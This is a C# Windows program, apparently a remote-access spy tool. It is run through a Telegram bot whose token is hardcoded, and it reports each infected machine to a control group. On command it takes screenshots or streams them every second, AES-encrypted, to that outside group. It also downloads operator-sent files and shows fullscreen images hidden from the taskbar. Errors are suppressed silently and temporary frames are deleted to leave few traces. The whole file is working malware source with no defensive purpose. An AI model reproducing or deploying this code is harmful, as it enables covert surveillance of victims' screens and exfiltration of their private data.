using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

namespace Agent
{
    class Program
    {
        private static readonly string AgentBotToken = "9203119575:AAEmkVH7_VOL0cZelc6z8U_mFnKIw3Ldtjk";
        private static readonly long GroupId = -5468496599;
        private static readonly byte[] AesKey = Convert.FromBase64String("c2VjcmV0X2tleV9mb3JfdmFudGFfMTIzNDU2Nzg=");

        private static int _slot = 1;
        private static TelegramBotClient _bot = null!;
        private static CancellationTokenSource? _streamCts;
        private static string _soundPath = "sound.wav";
        private static string _gifPath = "anim.gif";
        private static readonly string FramesDir = Path.Combine(Path.GetTempPath(), "svc_" + Guid.NewGuid().ToString("N"));

        [STAThread] // Обязательно для работы WinForms (скриншоты и гифки)
        static async Task Main(string[] args)
        {
            if (args.Length > 0 && int.TryParse(args[0], out int argSlot)) _slot = argSlot;
            else if (File.Exists("slot.txt") && int.TryParse(File.ReadAllText("slot.txt").Trim(), out int fileSlot)) _slot = fileSlot;

            _bot = new TelegramBotClient(AgentBotToken);
            using var cts = new CancellationTokenSource();

            var opts = new ReceiverOptions { AllowedUpdates = new[] { UpdateType.Message } };
            
            _bot.StartReceiving(
                updateHandler: Handle,
                errorHandler: (bot, ex, ct) => Task.CompletedTask, // Молчим при ошибках
                receiverOptions: opts,
                cancellationToken: cts.Token);

            try 
            { 
                var me = await _bot.GetMe();
                await _bot.SendMessage(GroupId, $"REG {_slot} {me.Id}", cancellationToken: cts.Token); 
            }
            catch { }

            await Task.Delay(-1, cts.Token);
        }

        private static async Task Handle(ITelegramBotClient bot, Update upd, CancellationToken ct)
        {
            var msg = upd.Message;
            if (msg == null) return;

            if (msg.Text is string t)
            {
                switch (t)
                {
                    case "/stream_start": StartStream(ct); break;
                    case "/stream_stop":
                    case "/stop": StopStream(); break;
                    case "/screen": _ = SendScreen(ct); break;
                    case "/sound":
                        if (File.Exists(_soundPath)) try { new SoundPlayer(_soundPath).Play(); } catch { }
                        break;
                    case "/gif":
                        if (File.Exists(_gifPath)) ShowGif(_gifPath); break;
                }
                return;
            }

            if (msg.Document is { } doc)
            {
                try
                {
                    var f = await bot.GetFile(doc.FileId, ct);
                    string target = doc.FileName == "sound.bin" ? _soundPath : _gifPath;
                    using (var fs = File.Create(target))
                        await bot.DownloadFile(f.FilePath!, fs, ct);
                }
                catch { }
            }
        }

        private static async void StartStream(CancellationToken ct)
        {
            StopStream();
            Directory.CreateDirectory(FramesDir);
            _streamCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            var token = _streamCts.Token;

            _ = Task.Run(async () =>
            {
                int i = 0;
                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        string framePath = Path.Combine(FramesDir, $"f_{i++:D6}.png");
                        byte[] png = CaptureScreen();
                        await File.WriteAllBytesAsync(framePath, png, token);
                        byte[] enc = Encrypt(png);
                        using var ms = new MemoryStream(enc);
                        await _bot.SendDocument(GroupId, new InputFileStream(ms, "s.bin"), cancellationToken: token);
                    }
                    catch { }
                    try { await Task.Delay(1000, token); } catch { break; }
                }
            }, token);
        }

        private static void StopStream()
        {
            try { _streamCts?.Cancel(); } catch { }
            _streamCts = null;
            WipeFrames();
        }

        private static void WipeFrames()
        {
            try
            {
                if (Directory.Exists(FramesDir))
                {
                    foreach (var f in Directory.GetFiles(FramesDir))
                        try { File.Delete(f); } catch { }
                    try { Directory.Delete(FramesDir, true); } catch { }
                }
            }
            catch { }
        }

        private static async Task SendScreen(CancellationToken ct)
        {
            try
            {
                byte[] enc = Encrypt(CaptureScreen());
                using var ms = new MemoryStream(enc);
                await _bot.SendDocument(GroupId, new InputFileStream(ms, "s.bin"), cancellationToken: ct);
            }
            catch { }
        }

        private static byte[] CaptureScreen()
        {
            var b = Screen.PrimaryScreen!.Bounds;
            using var bmp = new Bitmap(b.Width, b.Height);
            using (var g = Graphics.FromImage(bmp)) g.CopyFromScreen(Point.Empty, Point.Empty, b.Size);
            using var ms = new MemoryStream();
            bmp.Save(ms, ImageFormat.Png);
            return ms.ToArray();
        }

        private static void ShowGif(string path)
        {
            var thread = new Thread(() =>
            {
                var f = new Form
                {
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    BackColor = System.Drawing.Color.Black,
                    ShowInTaskbar = false // Скрываем из панели задач
                };
                var pb = new PictureBox { Image = Image.FromFile(path), SizeMode = PictureBoxSizeMode.Zoom, Dock = DockStyle.Fill };
                f.Controls.Add(pb);
                f.KeyDown += (_, e) => { if (e.KeyCode == Keys.Escape) f.Close(); };
                Application.Run(f);
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.IsBackground = true;
            thread.Start();
        }

        private static byte[] Encrypt(byte[] plain)
        {
            using var aes = new AesGcm(AesKey, 16);
            byte[] nonce = new byte[12]; RandomNumberGenerator.Fill(nonce);
            byte[] cipher = new byte[plain.Length]; byte[] tag = new byte[16];
            aes.Encrypt(nonce, plain, cipher, tag);
            byte[] result = new byte[28 + cipher.Length];
            Buffer.BlockCopy(nonce, 0, result, 0, 12);
            Buffer.BlockCopy(tag, 0, result, 12, 16);
            Buffer.BlockCopy(cipher, 0, result, 28, cipher.Length);
            return result;
        }
    }
}
